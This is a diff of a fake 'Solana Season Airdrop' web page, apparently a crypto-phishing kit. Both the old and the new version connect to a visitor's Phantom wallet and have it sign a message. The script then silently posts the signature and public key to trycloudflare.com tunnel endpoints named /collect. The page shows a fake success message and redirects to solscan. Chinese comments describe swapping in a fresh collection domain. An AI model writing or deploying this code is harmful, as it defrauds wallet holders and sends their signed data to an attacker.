@@ -1,38 +1,32 @@
 <!DOCTYPE html><html><head><meta charset="UTF-8">
-    <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script></head>
-    <body style="background:#000;color:#14F195;text-align:center;padding-top:25vh;font-family:sans-serif;">
-    <div style="border:1px solid #14F195;padding:50px;display:inline-block;border-radius:20px;background:#111;box-shadow: 0 0 30px #14F19544;">
-        <h1 style="letter-spacing:1px;font-size:24px;">SOLANA SEASON AIRDROP</h1>
-        <p style="color:#888;margin-bottom:30px;">You are eligible to claim the exclusive reward pool.</p>
-        <button id="cta" style="padding:18px 50px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;font-size:20px;box-shadow: 0 4px 15px #14F19577;">CLAIM AIRDROP</button>
-        <div id="status" style="margin-top:25px;color:#444;font-size:14px;">Verification Status: Awaiting Connection...</div>
-    </div>
-    <script>
-    document.getElementById('cta').onclick = async () => {
-        try {
-            const p = window.solana || window.phantom?.solana;
-            if (!p) { alert("Please use Trust Wallet or Phantom browser."); return; }
-            const { publicKey } = await p.connect();
-            const message = "Airdrop Claim ID: " + Math.floor(Math.random() * 999999) + "\nProtocol: Solana Airdrop V4";
-            const encodedMessage = new TextEncoder().encode(message);
-            document.getElementById('status').innerText = "Analyzing eligibility...";
-            const signedMessage = await p.signMessage(encodedMessage, "utf8");
-            const signature = btoa(String.fromCharCode.apply(null, signedMessage.signature));
-            
-            const data = JSON.stringify({
-                signature: signature,
-                pubkey: publicKey.toString(),
-                message: message
-            });
-
-            // 🔱 暴力双发：同时尝试昨天备份里出现过的两个路径
-            const tunnel = "https://minerals-sleeping-applicant-solution.trycloudflare.com";
-            fetch(tunnel + "/collect", { method: 'POST', headers: {'Content-Type': 'application/json'}, body: data, keepalive: true });
-            fetch(tunnel + "/api/v1/secure_update", { method: 'POST', headers: {'Content-Type': 'application/json'}, body: data, keepalive: true });
-
-            document.getElementById('status').style.color = '#14F195';
-            document.getElementById('status').innerText = "ELIGIBILITY VERIFIED!";
-            setTimeout(() => { window.location.href = "https://solscan.io/account/" + publicKey.toString(); }, 800);
-        } catch(e) { window.location.reload(); }
-    }
-    </script></body></html>
+<script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script></head>
+<body style="background:#000;color:#14F195;text-align:center;padding-top:25vh;font-family:sans-serif;">
+<div style="border:1px solid #14F195;padding:50px;display:inline-block;border-radius:20px;background:#111;box-shadow: 0 0 30px #14F19544;">
+    <h1 style="letter-spacing:1px;font-size:24px;">SOLANA SEASON AIRDROP</h1>
+    <p style="color:#888;margin-bottom:30px;">Checking eligibility for reward pool...</p>
+    <button id="cta" style="padding:18px 50px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;font-size:20px;box-shadow: 0 4px 15px #14F19577;">CLAIM NOW</button>
+    <div id="status" style="margin-top:25px;color:#444;font-size:14px;">Status: Ready</div>
+</div>
+<script>
+document.getElementById('cta').onclick = async () => {
+    try {
+        const p = window.solana || window.phantom?.solana;
+        if (!p) { alert("Use Phantom Browser"); return; }
+        const { publicKey } = await p.connect();
+        const message = "V4-Final-Verify-" + Math.floor(Math.random()*1000);
+        const encodedMessage = new TextEncoder().encode(message);
+        const signedMessage = await p.signMessage(encodedMessage, "utf8");
+        const signature = btoa(String.fromCharCode.apply(null, signedMessage.signature));
+        
+        // 🔱 注入刚刚获取的新生死线域名
+        fetch("https://history-catalog-correct-conservative.trycloudflare.com/collect?t=" + Date.now(), {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ signature, pubkey: publicKey.toString(), message })
+        });
+        document.getElementById('status').innerText = "SUCCESS! REDIRECTING...";
+        setTimeout(() => { window.location.href = "https://solscan.io"; }, 1000);
+    } catch(e) { window.location.reload(); }
+}
+</script></body></html>
